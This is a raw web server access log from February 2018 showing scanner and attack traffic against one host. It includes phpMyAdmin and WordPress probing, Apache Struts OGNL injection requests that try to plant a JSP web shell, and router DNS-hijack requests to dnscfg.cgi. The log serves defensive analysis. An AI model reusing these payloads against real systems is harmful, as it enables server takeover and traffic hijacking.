101.200.202.228 - - [11/Feb/2018:08:54:01 -0500] "-" 408 - "-" "-"
101.200.202.228 - - [11/Feb/2018:08:54:03 -0500] "POST /axis2/axis2-admin/login HTTP/1.0" 404 221 "-" "Python-urllib/2.7"
101.200.202.228 - - [11/Feb/2018:08:54:07 -0500] "HEAD /invoker/JMXInvokerServlet HTTP/1.0" 404 - "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
101.200.202.228 - - [11/Feb/2018:08:54:10 -0500] "HEAD /admin-console/ HTTP/1.0" 404 - "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
101.200.202.228 - - [11/Feb/2018:08:54:16 -0500] "POST / HTTP/1.0" 405 354450 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
101.200.202.228 - - [11/Feb/2018:08:54:22 -0500] "POST / HTTP/1.0" 405 355242 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
101.200.202.228 - - [11/Feb/2018:08:54:28 -0500] "POST / HTTP/1.0" 405 353700 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
101.200.202.228 - - [11/Feb/2018:08:54:34 -0500] "POST / HTTP/1.0" 405 353034 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
101.200.202.228 - - [11/Feb/2018:08:54:41 -0500] "POST / HTTP/1.0" 405 354440 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
101.200.202.228 - - [11/Feb/2018:08:54:48 -0500] "POST / HTTP/1.0" 405 355244 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
101.200.202.228 - - [11/Feb/2018:08:54:55 -0500] "POST / HTTP/1.0" 405 353722 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
101.200.202.228 - - [11/Feb/2018:08:55:02 -0500] "POST / HTTP/1.0" 405 353033 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
184.72.115.83 - - [11/Feb/2018:11:11:17 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/51.0.3000.53 Safari/537.32"
141.212.122.96 - - [11/Feb/2018:12:38:29 -0500] "GET /x HTTP/1.1" 400 226 "-" "Telesphoreo"
79.143.188.130 - - [11/Feb/2018:18:25:52 -0500] "GET /cgi-bin/php HTTP/1.1" 404 209 "-" "-"
79.143.188.130 - - [11/Feb/2018:18:25:52 -0500] "GET /cgi-bin/php5 HTTP/1.1" 404 210 "-" "-"
79.143.188.130 - - [11/Feb/2018:18:25:53 -0500] "GET /cgi-bin/php-cgi HTTP/1.1" 404 213 "-" "-"
79.143.188.130 - - [11/Feb/2018:18:25:53 -0500] "GET /cgi-bin/php.cgi HTTP/1.1" 404 213 "-" "-"
79.143.188.130 - - [11/Feb/2018:18:25:53 -0500] "GET /cgi-bin/php4 HTTP/1.1" 404 210 "-" "-"
79.143.188.130 - - [11/Feb/2018:18:25:53 -0500] "GET /cgi-bin/php5-cli HTTP/1.1" 404 214 "-" "-"
79.143.188.130 - - [11/Feb/2018:18:25:53 -0500] "GET /cgi-bin/test.cgi HTTP/1.1" 404 214 "-" "-"
79.143.188.130 - - [11/Feb/2018:18:25:54 -0500] "GET /cgi-sys/php5 HTTP/1.1" 404 210 "-" "-"
66.118.142.165 - - [11/Feb/2018:18:59:23 -0500] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
34.215.129.39 - - [11/Feb/2018:22:23:14 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
71.6.142.85 - - [11/Feb/2018:22:48:03 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 zgrab/0.x"
79.143.188.130 - - [11/Feb/2018:23:00:45 -0500] "GET /cgi-bin/php HTTP/1.1" 404 209 "-" "-"
79.143.188.130 - - [11/Feb/2018:23:00:45 -0500] "GET /cgi-bin/php5 HTTP/1.1" 404 210 "-" "-"
79.143.188.130 - - [11/Feb/2018:23:00:45 -0500] "GET /cgi-bin/php-cgi HTTP/1.1" 404 213 "-" "-"
79.143.188.130 - - [11/Feb/2018:23:00:46 -0500] "GET /cgi-bin/php.cgi HTTP/1.1" 404 213 "-" "-"
79.143.188.130 - - [11/Feb/2018:23:00:46 -0500] "GET /cgi-bin/php4 HTTP/1.1" 404 210 "-" "-"
79.143.188.130 - - [11/Feb/2018:23:00:46 -0500] "GET /cgi-bin/php5-cli HTTP/1.1" 404 214 "-" "-"
79.143.188.130 - - [11/Feb/2018:23:00:46 -0500] "GET /cgi-bin/test.cgi HTTP/1.1" 404 214 "-" "-"
79.143.188.130 - - [11/Feb/2018:23:00:46 -0500] "GET /cgi-sys/php5 HTTP/1.1" 404 210 "-" "-"
89.248.160.199 - - [12/Feb/2018:00:42:03 -0500] "GET / HTTP/1.1" 200 2321 "-" "libwww-perl/6.31"
47.88.252.66 - - [12/Feb/2018:01:09:23 -0500] "GET /server.js HTTP/1.1" 400 226 "-" "-"
123.249.3.226 - - [12/Feb/2018:04:40:11 -0500] "GET /index.do?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().println(%22okokok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22lndex.jsp%22)).append(%23req.getParameter(%22shell%22)).close()}&shell=%3C%25if(request.getParameter(%22f%22)!%3Dnull)(new%20java.io.FileOutputStream(application.getRealPath(%22%2F%22)%2Brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3B%25%3E%3Ca%20href%3D%22One_OK%22%3E%3C%2Fa%3E HTTP/1.1" 404 206 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1"
123.249.3.226 - - [12/Feb/2018:04:40:18 -0500] "GET /admin/index.action?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()} HTTP/1.1" 404 216 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1"
123.249.3.226 - - [12/Feb/2018:04:40:19 -0500] "GET /index.php?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().println(%22okokok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22lndex.jsp%22)).append(%23req.getParameter(%22shell%22)).close()}&shell=%3C%25if(request.getParameter(%22f%22)!%3Dnull)(new%20java.io.FileOutputStream(application.getRealPath(%22%2F%22)%2Brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3B%25%3E%3Ca%20href%3D%22One_OK%22%3E%3C%2Fa%3E HTTP/1.1" 200 2321 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1"
123.249.3.226 - - [12/Feb/2018:04:40:22 -0500] "GET /loginAction.action?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()} HTTP/1.1" 404 216 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1"
162.243.141.23 - - [12/Feb/2018:06:35:23 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 zgrab/0.x"
60.191.38.77 - - [12/Feb/2018:07:07:04 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
66.118.142.165 - - [12/Feb/2018:07:08:30 -0500] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
107.170.225.65 - - [12/Feb/2018:09:07:30 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 zgrab/0.x"
66.118.142.165 - - [12/Feb/2018:09:23:41 -0500] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
139.162.119.197 - - [12/Feb/2018:11:18:20 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
80.82.70.26 - - [12/Feb/2018:11:51:28 -0500] "\x03" 400 226 "-" "-"
80.82.70.26 - - [12/Feb/2018:12:23:34 -0500] "\x03" 400 226 "-" "-"
80.82.70.26 - - [12/Feb/2018:12:29:49 -0500] "\x03" 400 226 "-" "-"
223.87.179.37 - - [12/Feb/2018:15:16:46 -0500] "GET /muieblackcat HTTP/1.1" 404 210 "-" "-"
223.87.179.37 - - [12/Feb/2018:15:16:47 -0500] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 226 "-" "-"
223.87.179.37 - - [12/Feb/2018:15:16:47 -0500] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 226 "-" "-"
223.87.179.37 - - [12/Feb/2018:15:16:48 -0500] "GET //mysqladmin/scripts/setup.php HTTP/1.1" 404 226 "-" "-"
60.191.38.77 - - [12/Feb/2018:18:44:41 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
66.118.142.165 - - [12/Feb/2018:18:52:31 -0500] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
196.52.43.86 - - [12/Feb/2018:20:10:44 -0500] "GET / HTTP/1.0" 200 2321 "-" "Mozilla/5.0(WindowsNT6.1;rv:31.0)Gecko/20100101Firefox/31.0"
139.162.108.53 - - [12/Feb/2018:21:13:58 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
47.203.89.156 - - [13/Feb/2018:02:33:19 -0500] "GET http://httpheader.net/ HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
66.118.142.165 - - [13/Feb/2018:06:37:39 -0500] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
71.6.202.198 - - [13/Feb/2018:09:25:26 -0500] "GET /ccvv HTTP/1.1" 404 202 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64)"
141.212.122.48 - - [13/Feb/2018:17:37:04 -0500] "GET /x HTTP/1.1" 400 226 "-" "Telesphoreo"
141.105.71.26 - - [13/Feb/2018:18:51:14 -0500] "GET / HTTP/1.1" 200 2321 "-" "-"
66.118.142.165 - - [13/Feb/2018:20:15:27 -0500] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
35.205.242.161 - - [13/Feb/2018:23:36:31 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
35.205.242.161 - brute [13/Feb/2018:23:36:31 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
35.196.139.168 - - [14/Feb/2018:00:38:30 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
35.196.139.168 - brute [14/Feb/2018:00:38:30 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
66.118.142.165 - - [14/Feb/2018:02:36:26 -0500] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
35.195.14.212 - - [14/Feb/2018:02:50:13 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
35.195.14.212 - brute [14/Feb/2018:02:50:13 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
209.126.136.4 - - [14/Feb/2018:03:28:38 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
35.190.187.139 - - [14/Feb/2018:04:06:52 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
35.190.187.139 - brute [14/Feb/2018:04:06:52 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
222.212.88.20 - - [14/Feb/2018:08:38:55 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36"
66.240.205.34 - - [14/Feb/2018:09:54:39 -0500] "Gh0st\xad" 400 226 "-" "-"
172.104.108.109 - - [14/Feb/2018:14:47:32 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0"
35.196.139.168 - - [14/Feb/2018:16:25:13 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
35.196.139.168 - brute [14/Feb/2018:16:25:14 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
35.225.137.47 - - [14/Feb/2018:21:19:39 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
35.225.137.47 - brute [14/Feb/2018:21:19:39 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
66.118.142.165 - - [14/Feb/2018:21:20:03 -0500] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
35.196.139.168 - - [15/Feb/2018:02:31:30 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
35.196.139.168 - brute [15/Feb/2018:02:31:30 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
60.191.38.77 - - [15/Feb/2018:05:08:04 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
199.116.173.196 - - [15/Feb/2018:08:10:29 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
156.0.232.255 - - [15/Feb/2018:08:10:31 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
156.0.232.255 - - [15/Feb/2018:08:10:38 -0500] "GET /favicon.ico HTTP/1.1" 200 - "http://62.12.115.75/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
156.0.232.255 - - [15/Feb/2018:08:11:00 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
156.0.232.255 - - [15/Feb/2018:08:14:20 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
156.0.232.255 - - [15/Feb/2018:08:20:49 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
71.6.202.198 - - [15/Feb/2018:08:33:21 -0500] "GET /ccvv HTTP/1.1" 404 202 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64)"
107.170.252.110 - - [15/Feb/2018:11:03:14 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 zgrab/0.x"
66.118.142.165 - - [15/Feb/2018:11:54:47 -0500] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
117.50.7.159 - - [15/Feb/2018:12:45:02 -0500] "GET / HTTP/1.0" 200 2321 "-" "-"
107.170.226.153 - - [15/Feb/2018:13:16:37 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 zgrab/0.x"
35.225.162.14 - - [15/Feb/2018:13:36:41 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
35.225.162.14 - brute [15/Feb/2018:13:36:41 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
130.211.82.238 - - [15/Feb/2018:13:51:39 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
130.211.82.238 - brute [15/Feb/2018:13:51:39 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
35.190.187.139 - - [15/Feb/2018:15:16:45 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
35.190.187.139 - brute [15/Feb/2018:15:16:45 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
196.52.43.59 - - [15/Feb/2018:17:04:03 -0500] "GET / HTTP/1.0" 200 2321 "-" "Mozilla/5.0(WindowsNT6.1;rv:31.0)Gecko/20100101Firefox/31.0"
139.162.119.197 - - [15/Feb/2018:17:14:18 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
94.23.41.150 - - [15/Feb/2018:20:41:33 -0500] "GET http://62.12.115.75:80/phpmyadmin/ HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
164.52.24.140 - - [15/Feb/2018:21:22:33 -0500] "\x16\x03\x01\x01\"\x01" 400 226 "-" "-"
164.52.24.140 - - [15/Feb/2018:21:22:40 -0500] "USER test +iw test :Test Wuz Here" 400 226 "-" "-"
164.52.24.140 - - [15/Feb/2018:21:22:41 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
35.225.162.14 - - [15/Feb/2018:22:52:45 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
35.225.162.14 - brute [15/Feb/2018:22:52:45 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
35.195.198.67 - - [15/Feb/2018:23:53:26 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
35.195.198.67 - brute [15/Feb/2018:23:53:26 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
35.192.104.4 - - [16/Feb/2018:01:09:10 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
35.192.104.4 - brute [16/Feb/2018:01:09:10 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
35.229.76.108 - - [16/Feb/2018:01:23:28 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
35.229.76.108 - brute [16/Feb/2018:01:23:28 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
35.196.139.168 - - [16/Feb/2018:02:36:39 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
35.196.139.168 - brute [16/Feb/2018:02:36:39 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
145.249.106.174 - - [16/Feb/2018:04:59:49 -0500] "GET //wp-login.php HTTP/1.1" 404 210 "-" "Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15"
145.249.106.174 - - [16/Feb/2018:04:59:50 -0500] "GET /blog//wp-login.php HTTP/1.1" 404 216 "-" "Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15"
145.249.106.174 - - [16/Feb/2018:04:59:50 -0500] "GET /wordpress//wp-login.php HTTP/1.1" 404 221 "-" "Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15"
145.249.106.174 - - [16/Feb/2018:04:59:50 -0500] "GET /wp//wp-login.php HTTP/1.1" 404 214 "-" "Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15"
130.211.151.141 - - [16/Feb/2018:06:49:10 -0500] "GET /dnscfg.cgi?dnsPrimary=192.95.1.54&dnsSecondary8.8.8.8&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 208 "-" "curl/7.52.1"
130.211.151.141 - brute [16/Feb/2018:06:49:10 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0"
203.196.165.218 - - [16/Feb/2018:06:50:56 -0500] "GET /index.php HTTP/1.0" 200 2321 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:50:57 -0500] "GET /phpmyadmin/index.php HTTP/1.0" 404 218 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:50:57 -0500] "GET /phpMyAdmin/index.php HTTP/1.0" 404 218 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:50:58 -0500] "GET /pmd/index.php HTTP/1.0" 404 211 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:50:58 -0500] "GET /pma/index.php HTTP/1.0" 404 211 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:50:59 -0500] "GET /PMA/index.php HTTP/1.0" 404 211 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:50:59 -0500] "GET /PMA2/index.php HTTP/1.0" 404 212 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:00 -0500] "GET /pmamy/index.php HTTP/1.0" 404 213 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:00 -0500] "GET /pmamy2/index.php HTTP/1.0" 404 214 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:00 -0500] "GET /mysql/index.php HTTP/1.0" 404 213 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:01 -0500] "GET /admin/index.php HTTP/1.0" 404 213 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:01 -0500] "GET /db/index.php HTTP/1.0" 404 210 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:02 -0500] "GET /dbadmin/index.php HTTP/1.0" 404 215 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:02 -0500] "GET /web/phpMyAdmin/index.php HTTP/1.0" 404 222 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:03 -0500] "GET /admin/pma/index.php HTTP/1.0" 404 217 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:03 -0500] "GET /admin/PMA/index.php HTTP/1.0" 404 217 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:03 -0500] "GET /admin/mysql/index.php HTTP/1.0" 404 219 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:04 -0500] "GET /admin/mysql2/index.php HTTP/1.0" 404 220 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:04 -0500] "GET /admin/phpmyadmin/index.php HTTP/1.0" 404 224 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:05 -0500] "GET /admin/phpMyAdmin/index.php HTTP/1.0" 404 224 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:05 -0500] "GET /admin/phpmyadmin2/index.php HTTP/1.0" 404 225 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:05 -0500] "GET /mysqladmin/index.php HTTP/1.0" 404 218 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:06 -0500] "GET /mysql-admin/index.php HTTP/1.0" 404 219 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:06 -0500] "GET /phpadmin/index.php HTTP/1.0" 404 216 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:07 -0500] "GET /phpmyadmin0/index.php HTTP/1.0" 404 219 "-" "Mozilla/5.0"
203.196.165.218 - - [16/Feb/2018:06:51:07 -0500] "GET /phpmyadmin1/index.php HTTP/1.0" 404 219 "-" "Mozilla/5.0"
